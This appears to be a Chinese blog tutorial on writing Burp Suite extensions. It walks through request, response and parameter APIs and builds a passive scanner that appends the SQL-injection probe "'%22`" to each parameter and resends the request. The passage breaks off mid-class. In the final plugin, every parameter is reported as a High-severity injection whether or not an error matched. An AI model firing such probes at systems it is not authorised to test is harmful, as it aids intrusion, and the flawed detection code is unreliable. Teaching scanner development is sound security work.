+<h3 id="0x04-IRequestInfo：获取请求信息"><a href="#0x04-IRequestInfo：获取请求信息" class="headerlink" title="0x04 IRequestInfo：获取请求信息"></a><strong>0x04 IRequestInfo：获取请求信息</strong></h3><p>官方api地址：<a target="_blank" rel="noopener" href="https://portswigger.net/burp/extender/api/burp/IRequestInfo.html">https://portswigger.net/burp/extender/api/burp/IRequestInfo.html</a>, 有以下方法：</p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/26.jpg" alt="图片"></p>
+<p>getHeaders用于获取请求中包含的HTTP头。返回：请求中包含的HTTP标头。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reqHeaders &#x3D; analyzedRequest.getHeaders()</span><br></pre></td></tr></table></figure>
+
+<p>获取消息正文开始的请求中的偏移量。返回：消息正文开始的请求中的偏移量。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reqBodys &#x3D; request[analyzedRequest.getBodyOffset():].tostring()</span><br></pre></td></tr></table></figure>
+
+<p>获取请求方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reqMethod &#x3D; analyzedRequest.getMethod()</span><br></pre></td></tr></table></figure>
+
+<p>获取请求中包含的参数。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reqParameters &#x3D; analyzedRequest.getParameters()</span><br></pre></td></tr></table></figure>
+
+<p>获取请求中的URL</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reqUrl &#x3D; analyzedRequest.getUrl()</span><br></pre></td></tr></table></figure>
+
+<p>获取请求包的一些信息：请求头，请求内容，请求方法，请求参数的代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 获取请求的一些信息：请求头，请求内容，请求方法，请求参数</span><br><span class="line">def get_request_info(self, request):</span><br><span class="line">   analyzedRequest &#x3D; self._helpers.analyzeRequest(request)  # analyzeRequest用于分析HTTP请求，并获取有关它的各种关键详细信息。生成的IRequestInfo对象</span><br><span class="line">   reqHeaders &#x3D; analyzedRequest.getHeaders()  # 用于获取请求中包含的HTTP头。返回：请求中包含的HTTP标头。</span><br><span class="line">   reqBodys &#x3D; request[analyzedRequest.getBodyOffset():].tostring()  # 获取消息正文开始的请求中的偏移量。返回：消息正文开始的请求中的偏移量。</span><br><span class="line">   reqMethod &#x3D; analyzedRequest.getMethod()  # 获取请求方法</span><br><span class="line">   reqParameters &#x3D; analyzedRequest.getParameters() # 获取请求中包含的参数。</span><br><span class="line">   return analyzedRequest, reqHeaders, reqBodys, reqMethod, reqParameters</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="0x05-IParameter：获取请求包的参数"><a href="#0x05-IParameter：获取请求包的参数" class="headerlink" title="0x05 IParameter：获取请求包的参数"></a><strong>0x05 IParameter：获取请求包的参数</strong></h3><p>官方API：<a target="_blank" rel="noopener" href="https://portswigger.net/burp/extender/api/burp/IParameter.html">https://portswigger.net/burp/extender/api/burp/IParameter.html</a></p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/27.jpg" alt="图片"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">reqParameters &#x3D; analyzedRequest.getParameters()# 返回的是列表</span><br><span class="line">for parameter in reqParameters:</span><br><span class="line">   parameterName &#x3D; parameter.getName()</span><br><span class="line">   parameterValue &#x3D; parameter.getValue()</span><br><span class="line">   parameterType &#x3D; parameter.getType()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="0x06-IResponseInfo：获取响应信息"><a href="#0x06-IResponseInfo：获取响应信息" class="headerlink" title="0x06 IResponseInfo：获取响应信息"></a><strong>0x06 IResponseInfo：获取响应信息</strong></h3><p>此接口用于检索有关HTTP响应的关键详细信息。</p>
+<p>官方api地址：<a target="_blank" rel="noopener" href="https://portswigger.net/burp/extender/api/burp/IResponseInfo.html">https://portswigger.net/burp/extender/api/burp/IResponseInfo.html</a>, 有以下方法：</p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/28.jpg" alt="图片"></p>
+<p>getHeaders方法用于获取响应中包含的HTTP标头。返回：响应中包含的HTTP标头。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">resHeaders &#x3D; analyzedResponse.getHeaders()</span><br></pre></td></tr></table></figure>
+
+<p>getBodyOffset方法用于获取消息正文开始的响应中的偏移量。返回：消息正文开始的响应中的偏移量。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">response[analyzedResponse.getBodyOffset():]获取正文内容</span><br><span class="line">resBodys &#x3D; response[analyzedResponse.getBodyOffset():].tostring()</span><br></pre></td></tr></table></figure>
+
+<p>getStatusCode获取响应中包含的HTTP状态代码。返回：响应中包含的HTTP状态代码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">resStatusCode &#x3D; analyzedResponse.getStatusCode()</span><br></pre></td></tr></table></figure>
+
+<p>获取响应的一些信息：响应头，响应内容，响应状态码的代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 获取响应的一些信息：响应头，响应内容，响应状态码</span><br><span class="line">   def get_response_info(self, response):</span><br><span class="line">     analyzedResponse &#x3D; self._helpers.analyzeResponse(response)  #  analyzeResponse方法可用于分析HTTP响应，并获取有关它的各种关键详细信息。返回：IResponseInfo可以查询的对象以获取有关响应的详细信息。</span><br><span class="line">     resHeaders &#x3D; analyzedResponse.getHeaders()  # getHeaders方法用于获取响应中包含的HTTP标头。返回：响应中包含的HTTP标头。</span><br><span class="line">     resBodys &#x3D;  response[analyzedResponse.getBodyOffset():].tostring()  #  getBodyOffset方法用于获取消息正文开始的响应中的偏移量。返回：消息正文开始的响应中的偏移量。response[analyzedResponse.getBodyOffset():]获取正文内容</span><br><span class="line">     resStatusCode &#x3D; analyzedResponse.getStatusCode()  # getStatusCode获取响应中包含的HTTP状态代码。返回：响应中包含的HTTP状态代码。</span><br><span class="line">     return resHeaders, resBodys, resStatusCode</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="Burp-Extender-Apis-插件开发-（四）"><a href="#Burp-Extender-Apis-插件开发-（四）" class="headerlink" title="Burp Extender Apis 插件开发 （四）"></a>Burp Extender Apis 插件开发 （四）</h1><h3 id="0x01-buildParameter"><a href="#0x01-buildParameter" class="headerlink" title="0x01 buildParameter"></a><em><strong>0x01 buildParameter</strong></em></h3><p>buildParameter(java.lang.String name, java.lang.String value, byte type) –&gt; IParameter</p>
+<p>传递的三个参数分别是参数名，参数值，参数类型 –&gt; 返回IParameter对象</p>
+<p>官方api：<a target="_blank" rel="noopener" href="https://portswigger.net/burp/extender/api/burp/IExtensionHelpers.html#buildParameter(java.lang.String,%20java.lang.String,%20byte)">https://portswigger.net/burp/extender/api/burp/IExtensionHelpers.html#buildParameter(java.lang.String,%20java.lang.String,%20byte)</a></p>
+<p>示例代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 构造参数</span><br><span class="line">parameterValueSQL &#x3D; parameterValue + payload# parameterValue是原始数据包的参数值，然后拼接sql注入的payload成新的参数值</span><br><span class="line">newParameter &#x3D; self._helpers.buildParameter(parameterName, parameterValueSQL, parameterType)</span><br><span class="line">newParameterName &#x3D; newParameter.getName()# 参数名</span><br><span class="line">newParameterValue &#x3D; newParameter.getValue()# 参数值</span><br><span class="line">newParameterType &#x3D; newParameter.getType()# 参数类型</span><br></pre></td></tr></table></figure>
+
+<p>使用buildParameter构造新的参数后，需要用updateParameter更新请求包</p>
+<h3 id="0x02-updateParameter"><a href="#0x02-updateParameter" class="headerlink" title="0x02 updateParameter"></a><em><strong>0x02 updateParameter</strong></em></h3><p>updateParameter(byte[] request, IParameter parameter) –&gt; request</p>
+<p>传递的两个参数分别是request，IParameter 对象</p>
+<p>官方api：<a target="_blank" rel="noopener" href="https://portswigger.net/burp/extender/api/burp/IExtensionHelpers.html#updateParameter(byte[],%20burp.IParameter)">https://portswigger.net/burp/extender/api/burp/IExtensionHelpers.html#updateParameter(byte[],%20burp.IParameter)</a></p>
+<p>示例代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">newRequest &#x3D; self._helpers.updateParameter(request, newParameter)</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">request:   原始请求数据包</span><br><span class="line">newParameter: 使用buildParameter构造的带有payload的参数</span><br><span class="line">&#39;&#39;&#39;</span><br></pre></td></tr></table></figure>
+
+<p>使用updateParameter更新请求包的参数后，这时候请求包就带有了payload，接下来就要发送这个新的请求数据包</p>
+<h3 id="0x03-makeHttpRequest"><a href="#0x03-makeHttpRequest" class="headerlink" title="0x03 makeHttpRequest"></a><em><strong>0x03 makeHttpRequest</strong></em></h3><p>makeHttpRequest(IHttpService httpService, byte[] request) –&gt; IHttpRequestResponse<br>传递的两个参数分别是IHttpService对象，request –&gt; 返回IHttpRequestResponse对象<br>发出HTTP请求并检索其响应:<br>link:<a target="_blank" rel="noopener" href="https://portswigger.net/burp/extender/api/burp/IBurpExtenderCallbacks.html#makeHttpRequest(burp.IHttpService,%20byte[])">https://portswigger.net/burp/extender/api/burp/IBurpExtenderCallbacks.html#makeHttpRequest(burp.IHttpService,%20byte[])</a><br>示例代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">httpService &#x3D; self.baseRequestResponse.getHttpService()# IHttpService参数是原始数据包的getHttpService()方法返回的</span><br><span class="line">newIHttpRequestResponse &#x3D; self._callbacks.makeHttpRequest(httpService, newRequest)</span><br></pre></td></tr></table></figure>
+
+<p>通过上述三种api就实现了请求包携带我们的payload发送。</p>
+<h3 id="0x04-实例"><a href="#0x04-实例" class="headerlink" title="0x04 实例"></a><em><strong>0x04 实例</strong></em></h3><p>编写一个简单的注入检测插件：payload为’%22`</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"># -*-coding:utf-8 -*-</span><br><span class="line"># 被动扫描</span><br><span class="line">from burp import IBurpExtender, IScannerCheck</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">class BurpExtender(IBurpExtender, IScannerCheck):</span><br><span class="line">   def registerExtenderCallbacks(self, callbacks):</span><br><span class="line"></span><br><span class="line">​     # Required for easier debugging:</span><br><span class="line">​     sys.stdout &#x3D; callbacks.getStdout()</span><br><span class="line"></span><br><span class="line">​     # 用于设置当前扩展的显示名称，该名称将显示在Extender工具的用户界面中。参数：name - 扩展名。。</span><br><span class="line">​     self._callbacks &#x3D; callbacks</span><br><span class="line"></span><br><span class="line">​     # 用于获取IExtensionHelpers对象，扩展可以使用该对象执行许多有用的任务。返回：包含许多帮助器方法的对象，用于构建和分析HTTP请求等任务。</span><br><span class="line">​     self._helpers &#x3D; callbacks.getHelpers()</span><br><span class="line"></span><br><span class="line">​     # 用于设置当前扩展的显示名称，该名称将显示在Extender工具的用户界面中。参数：name - 扩展名。</span><br><span class="line">​     self._callbacks.setExtensionName(&quot;demo_doPassiveScan2&quot;)</span><br><span class="line"></span><br><span class="line">​     # 注册扫描</span><br><span class="line">​     callbacks.registerScannerCheck(self)</span><br><span class="line"></span><br><span class="line">   def doPassiveScan(self, baseRequestResponse):</span><br><span class="line">     request &#x3D; baseRequestResponse.getRequest()  # 返回request</span><br><span class="line">     analyzedIRequestInfo &#x3D; self._helpers.analyzeRequest(request)  # 返回IRequestInfo对象</span><br><span class="line">     httpService &#x3D; baseRequestResponse.getHttpService()  # IHttpService参数是原始数据包的getHttpService()方法返回的</span><br><span class="line">     reqParameters &#x3D; analyzedIRequestInfo.getParameters()  # 获取参数</span><br><span class="line"></span><br><span class="line">​     # 遍历每个参数，包含get，post，cookies</span><br><span class="line">​     for parameter in reqParameters:</span><br><span class="line">​       parameterName, parameterValue, parameterType &#x3D; parameter.getName(), parameter.getValue(), parameter.getType()</span><br><span class="line">​       # 构造参数</span><br><span class="line">​       parameterValueSQL &#x3D; parameterValue + &quot;&#39;%22&#96;&quot;</span><br><span class="line">​       newParameter &#x3D; self._helpers.buildParameter(parameterName, parameterValueSQL, parameterType)</span><br><span class="line">​       # 更新请求包</span><br><span class="line">​       newRequest &#x3D; self._helpers.updateParameter(request, newParameter)</span><br><span class="line">​       # 发送请求</span><br><span class="line">​       newIHttpRequestResponse &#x3D; self._callbacks.makeHttpRequest(httpService, newRequest)</span><br><span class="line">​       response &#x3D; newIHttpRequestResponse.getResponse()  # 获取响应包</span><br><span class="line">​       analyzedIResponseInfo &#x3D; self._helpers.analyzeRequest(</span><br><span class="line">​         response)  # analyzeResponse方法可用于分析HTTP响应，并获取有关它的各种关键详细信息。返回：IResponseInfo可以查询的对象以获取有关响应的详细信息。</span><br><span class="line">​       resBodys &#x3D; response[analyzedIResponseInfo.getBodyOffset():].tostring()</span><br><span class="line">​       print resBodys</span><br><span class="line">​       if &#39; SQL syntax&#39; in resBodys:</span><br><span class="line">​         print &#39;is SQL&#39;</span><br></pre></td></tr></table></figure>
+
+<p>效果如下：可以看到打印的响应包就是加载payload后的响应包</p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/29.jpg" alt="图片"></p>
+<h1 id="Burp-Extender-Apis-插件开发-（五）"><a href="#Burp-Extender-Apis-插件开发-（五）" class="headerlink" title="Burp Extender Apis 插件开发 （五）"></a>Burp Extender Apis 插件开发 （五）</h1><h3 id="0x01-IScanIssue"><a href="#0x01-IScanIssue" class="headerlink" title="0x01 IScanIssue"></a><em><strong>0x01 IScanIssue</strong></em></h3><p>此界面用于展示漏洞的详细信息。</p>
+<p>官方api：<a target="_blank" rel="noopener" href="https://portswigger.net/burp/extender/api/burp/IScanIssue.html">https://portswigger.net/burp/extender/api/burp/IScanIssue.html</a></p>
+<p>有如下方法：</p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/30.jpg" alt="图片"></p>
+<p>那么我们可以定义一个专门存储漏洞的类，只要继承IScanIssue即可。</p>
+<p>示例代码如下：参数解释也在代码注释里</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">class CustomScanIssue(IScanIssue):</span><br><span class="line">   def __init__(self, httpService, url, httpMessages, name, detail, severity):</span><br><span class="line">     &#39;&#39;&#39;</span><br><span class="line">     :param httpService: HTTP服务</span><br><span class="line">     :param url: 漏洞url</span><br><span class="line">     :param httpMessages: HTTP消息</span><br><span class="line">     :param name: 漏洞名</span><br><span class="line">     :param detail: 漏洞细节</span><br><span class="line">     :param severity: 漏洞等级</span><br><span class="line">     &#39;&#39;&#39;</span><br><span class="line">     self._httpService &#x3D; httpService</span><br><span class="line">     self._url &#x3D; url</span><br><span class="line">     self._httpMessages &#x3D; httpMessages</span><br><span class="line">     self._name &#x3D; name</span><br><span class="line">     self._detail &#x3D; detail</span><br><span class="line">     self._severity &#x3D; severity</span><br><span class="line"></span><br><span class="line">   def getUrl(self):</span><br><span class="line">     return self._url</span><br><span class="line"></span><br><span class="line">   def getIssueName(self):</span><br><span class="line">     return self._name</span><br><span class="line"></span><br><span class="line">   def getIssueType(self):</span><br><span class="line">     return 0</span><br><span class="line"></span><br><span class="line">   def getSeverity(self):</span><br><span class="line">     return self._severity</span><br><span class="line"></span><br><span class="line">   def getConfidence(self):</span><br><span class="line">     return &quot;Certain&quot;</span><br><span class="line"></span><br><span class="line">   def getIssueBackground(self):</span><br><span class="line">     pass</span><br><span class="line"></span><br><span class="line">   def getRemediationBackground(self):</span><br><span class="line">     pass</span><br><span class="line"></span><br><span class="line">   def getIssueDetail(self):</span><br><span class="line">     return self._detail</span><br><span class="line"></span><br><span class="line">   def getRemediationDetail(self):</span><br><span class="line">     pass</span><br><span class="line"></span><br><span class="line">   def getHttpMessages(self):</span><br><span class="line">     return self._httpMessages</span><br><span class="line"></span><br><span class="line">   def getHttpService(self):</span><br><span class="line">     return self._httpService</span><br></pre></td></tr></table></figure>
+
+<p>接下来就是存储存在漏洞的数据包了，实际上每一个报告都是一个CustomScanIssue对象，所以如果检测出该payload能够验证漏洞的时候，实例化一个CustomScanIssue对象，第一个参数是该payload的数据包的http服务，第二个参数是该payload的url，第三个参数是该payload的IHttpRequestResponse，第四个参数是漏洞名，第五个参数是漏洞细节，第六个参数是漏洞等级。</p>
+<p>然后将每个CustomScanIssue对象存到列表里，当执行完被动扫描后，return该列表即可。那么issues模块就会出现存在漏洞的数据包！</p>
+<p>示例代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">issues.append(CustomScanIssue(</span><br><span class="line">         newIHttpRequestResponse.getHttpService(),</span><br><span class="line">         self._helpers.analyzeRequest(newIHttpRequestResponse).getUrl(),</span><br><span class="line">         [newIHttpRequestResponse],</span><br><span class="line">         &quot;SQL&quot;,</span><br><span class="line">         &quot;Error Inject&quot;,</span><br><span class="line">         &quot;High&quot;))</span><br></pre></td></tr></table></figure>
+
+<p>这里还有一个小tips，就是当存在漏洞的数据包重复的时候，使用consolidateDuplicateIssues可以过滤。</p>
+<p>示例代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">def consolidateDuplicateIssues(self, existingIssue, newIssue):</span><br><span class="line">   &#39;&#39;&#39;</span><br><span class="line">     相同的数据包，只报告一份报告</span><br><span class="line">     :param existingIssue:</span><br><span class="line">     :param newIssue:</span><br><span class="line">     :return:</span><br><span class="line">   &#39;&#39;&#39;</span><br><span class="line">   if existingIssue.getIssueDetail() &#x3D;&#x3D; newIssue.getIssueDetail():</span><br><span class="line">     return -1</span><br><span class="line"></span><br><span class="line">   return 0</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="0x02-一个简单的注入检测插件"><a href="#0x02-一个简单的注入检测插件" class="headerlink" title="0x02 一个简单的注入检测插件"></a><em><strong>0x02 一个简单的注入检测插件</strong></em></h3><p>示例代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"># -*-coding:utf-8 -*-</span><br><span class="line"># 被动扫描</span><br><span class="line">from burp import IBurpExtender, IScannerCheck, IScanIssue, IMessageEditorTabFactory, IContextMenuFactory</span><br><span class="line">from burp import IScanIssue</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">class BurpExtender(IBurpExtender, IScannerCheck):</span><br><span class="line">   def registerExtenderCallbacks(self, callbacks):</span><br><span class="line"></span><br><span class="line">​     # Required for easier debugging:</span><br><span class="line">​     sys.stdout &#x3D; callbacks.getStdout()</span><br><span class="line"></span><br><span class="line">​     # 用于设置当前扩展的显示名称，该名称将显示在Extender工具的用户界面中。参数：name - 扩展名。。</span><br><span class="line">​     self._callbacks &#x3D; callbacks</span><br><span class="line"></span><br><span class="line">​     # 用于获取IExtensionHelpers对象，扩展可以使用该对象执行许多有用的任务。返回：包含许多帮助器方法的对象，用于构建和分析HTTP请求等任务。</span><br><span class="line">​     self._helpers &#x3D; callbacks.getHelpers()</span><br><span class="line"></span><br><span class="line">​     # 用于设置当前扩展的显示名称，该名称将显示在Extender工具的用户界面中。参数：name - 扩展名。</span><br><span class="line">​     self._callbacks.setExtensionName(&quot;demo_doPassiveScan2&quot;)</span><br><span class="line"></span><br><span class="line">​     # 注册扫描</span><br><span class="line">​     callbacks.registerScannerCheck(self)</span><br><span class="line"></span><br><span class="line">   def doPassiveScan(self, baseRequestResponse):</span><br><span class="line">     request &#x3D; baseRequestResponse.getRequest()  # 返回request</span><br><span class="line">     analyzedIRequestInfo &#x3D; self._helpers.analyzeRequest(request)  # 返回IRequestInfo对象</span><br><span class="line">     httpService &#x3D; baseRequestResponse.getHttpService()  # IHttpService参数是原始数据包的getHttpService()方法返回的</span><br><span class="line">     reqParameters &#x3D; analyzedIRequestInfo.getParameters()  # 获取参数</span><br><span class="line">     issues &#x3D; []</span><br><span class="line">     # 遍历每个参数，包含get，post，cookies</span><br><span class="line">     for parameter in reqParameters:</span><br><span class="line">       parameterName, parameterValue, parameterType &#x3D; parameter.getName(), parameter.getValue(), parameter.getType()</span><br><span class="line">       # 构造参数</span><br><span class="line">       parameterValueSQL &#x3D; parameterValue + &quot;&#39;%22&#96;&quot;</span><br><span class="line">       newParameter &#x3D; self._helpers.buildParameter(parameterName, parameterValueSQL, parameterType)</span><br><span class="line">       # 更新请求包</span><br><span class="line">       newRequest &#x3D; self._helpers.updateParameter(request, newParameter)</span><br><span class="line">       # 发送请求</span><br><span class="line">       newIHttpRequestResponse &#x3D; self._callbacks.makeHttpRequest(httpService, newRequest)</span><br><span class="line">       response &#x3D; newIHttpRequestResponse.getResponse()  # 获取响应包</span><br><span class="line">       analyzedIResponseInfo &#x3D; self._helpers.analyzeRequest(</span><br><span class="line">         response)  # analyzeResponse方法可用于分析HTTP响应，并获取有关它的各种关键详细信息。返回：IResponseInfo可以查询的对象以获取有关响应的详细信息。</span><br><span class="line">       resBodys &#x3D; response[analyzedIResponseInfo.getBodyOffset():].tostring()</span><br><span class="line">       print resBodys</span><br><span class="line">       if &#39; SQL syntax&#39; in resBodys:</span><br><span class="line">         print &#39;is SQL&#39;</span><br><span class="line"></span><br><span class="line">​       issues.append(CustomScanIssue(</span><br><span class="line">​         newIHttpRequestResponse.getHttpService(),</span><br><span class="line">​         self._helpers.analyzeRequest(newIHttpRequestResponse).getUrl(),</span><br><span class="line">​         [newIHttpRequestResponse],</span><br><span class="line">​         &quot;SQL&quot;,</span><br><span class="line">​         &quot;Error Inject&quot;,</span><br><span class="line">​         &quot;High&quot;))</span><br><span class="line">​     return issues</span><br><span class="line"></span><br><span class="line">   def consolidateDuplicateIssues(self, existingIssue, newIssue):</span><br><span class="line">     &#39;&#39;&#39;</span><br><span class="line">     相同的数据包，只报告一份报告</span><br><span class="line">     :param existingIssue:</span><br><span class="line">     :param newIssue:</span><br><span class="line">     :return:</span><br><span class="line">     &#39;&#39;&#39;</span><br><span class="line"></span><br><span class="line">​     if existingIssue.getIssueDetail() &#x3D;&#x3D; newIssue.getIssueDetail():</span><br><span class="line">​       return -1</span><br><span class="line"></span><br><span class="line">​     return 0</span><br><span class="line"></span><br><span class="line">class CustomScanIssue(IScanIssue):</span><br><span class="line">   def __init__(self, httpService, url, httpMessages, name, detail, severity):</span><br><span class="line">     &#39;&#39;&#39;</span><br><span class="line"></span><br><span class="line">​     :param httpService: HTTP服务</span><br><span class="line">​     :param url: 漏洞url</span><br><span class="line">​     :param httpMessages: HTTP消息</span><br><span class="line">​     :param name: 漏洞名</span><br><span class="line">​     :param detail: 漏洞细节</span><br><span class="line">​     :param severity: 漏洞等级</span><br><span class="line">​     &#39;&#39;&#39;</span><br><span class="line">​     self._httpService &#x3D; httpService</span><br><span class="line">​     self._url &#x3D; 